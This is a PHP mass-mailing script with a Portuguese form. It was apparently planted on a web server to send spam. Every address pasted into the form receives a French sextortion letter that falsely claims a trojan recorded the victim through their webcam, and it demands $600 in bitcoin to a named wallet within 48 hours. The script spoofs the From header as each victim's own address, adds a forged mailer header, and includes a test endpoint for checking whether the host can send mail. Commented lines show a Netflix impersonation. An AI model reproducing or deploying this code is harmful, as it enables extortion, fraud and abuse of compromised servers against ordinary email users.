 <?php
 
echo '<FIELDSET>';
echo '<LEGEND> Sistema de Envio </LEGEND><P>';
echo '<form name="FORM1" method="POST" action="" />';
echo '<textarea name="lista" cols="35" rows="11" WRAP="OFF"></textarea>';
echo "<br>";
echo '<input name="enviar" type="submit" value="enviar" />';
echo '</FIELDSET>'; 
 
if (isset($_REQUEST["teste"])){
   if (mail($_REQUEST["teste"], $_SERVER['HTTP_HOST'], $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])){ 
       echo "-BEGINLN- Verifica&#231;&#227;o, Enviado com sucesso: " . $_REQUEST["teste"] . " -ENDLN- <br>\n";
       } else {
         echo "-BEGINLN- Verifica&#231;&#227;o, Erro ao tentar enviar: " . $_REQUEST["teste"] . " -ENDLN- <br>\n";
        }
exit;
}

function random_num(){
 for($x = 0; $x < 4; $x++){
     $n = $n . rand(1,9);
    }
 return mt_rand(1,2) . $n;
}


$mail_body = "Salut
Comme vous l'avez peut-être remarqué, je vous ai envoyé un e-mail depuis votre compte de messagerie.

Cela signifie que j'ai un accès complet à votre compte de messagerie.
Je t'observe depuis quelques mois maintenant.
Le fait est que vous avez été infecté par un cheval de Troie via un site pour adultes que vous avez visité.
Si vous n'êtes pas familier avec cela, je vais vous expliquer.

Trojan me donne un accès et un contrôle complets sur votre appareil.
Cela signifie que je peux tout voir sur votre écran, allumer la caméra et le microphone, mais vous ne le savez pas.
J'ai également accès à tous vos contacts et à toute votre correspondance.

J'ai fait une vidéo montrant comment vous vous contentez dans la moitié gauche de l'écran et dans la droite moitié vous voyez la vidéo que vous avez regardée.
Vous ne pouviez pas savoir que la caméra fonctionnait.

En un clic de souris, je peux envoyer cette vidéo à tous vos mails et contacts sur les réseaux sociaux.
Je peux également afficher l'accès à toute votre correspondance de contact et aux messagers que vous utilisez.

Si vous voulez éviter cela, transférez le montant de $600 USD à mon adresse bitcoin (si vous ne savez pas comment faire, écrivez à Google : Coinmama ou bitpanda ou coinbase).

Mon adresse bitcoin (portefeuille BTC) est : bc1qhdwj2v8j58uuajqu7rmj2uudejnu3y4hnax5z8
Après réception du paiement, je supprimerai la vidéo et vous ne m'entendrez plus jamais.

Je vous donne 48 heures pour payer. J'ai un avis de lecture de cette lettre, et la minuterie fonctionnera lorsque vous verrez cette lettre.
Si je constate que vous avez partagé ce message avec quelqu'un d'autre, la vidéo sera immédiatement distribué.
Sincères salutations";


if (isset($_POST["enviar"])){
    
   $list_mail  = explode("\r\n", rtrim($_POST["lista"]));
   sort($list_mail);
   
   #$send_name  = "NetFlix";  
   $subject    = "Vous avez un paiement en attente."; 
   #$send_mail  = "netflix@support.info"; 


    function datahora($a = false) {
      $data = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
	  if ($a){
      $data = gmdate("d/m/Y H:i:s", $data);
	  } else {
	    $data = gmdate('D, d M Y H:i:s', $data);
	   }
      return $data;
     }

    $list_pos    = 0;
	$send_erros  = 0;
    $list_length = (count($list_mail) -1);
	
    foreach ($list_mail as $email) {
	$list_pos++;
	$email = strtolower(rtrim($email));

	
	$header  = "Mime-Version: 1.0\n";
	$header .= "Content-Type: text/html\n";
	#$header .= "From: $send_name <$send_mail>\n";
	$header .= "From: <$email>\n";
	$header .= "X-PHP-Script: www.mail2.terra.com.br\n";
	
	 
	 if (!empty($email)){
         if (mail($email, $subject, $mail_body, $header) == true){
            echo "-BEGINLN-" . datahora(true) . " Enviado com sucesso: " . $email . " [$list_pos de $list_length] -ENDLN- <br>\n";
            } else {
              echo "-BEGINLN-" . datahora(true) . " Erro ao tentar enviar: " . $email . " [$list_pos de $list_length] -ENDLN- <br>\n";
			  $send_erros++;
			  if ($send_erros == 100){
				 exit("-BEGINLN- Limite de erros atigindo, envio abortado. -ENDLN-<br>\n");
				 }
	          }
    flush();
        }
	}
exit;	
} 
?>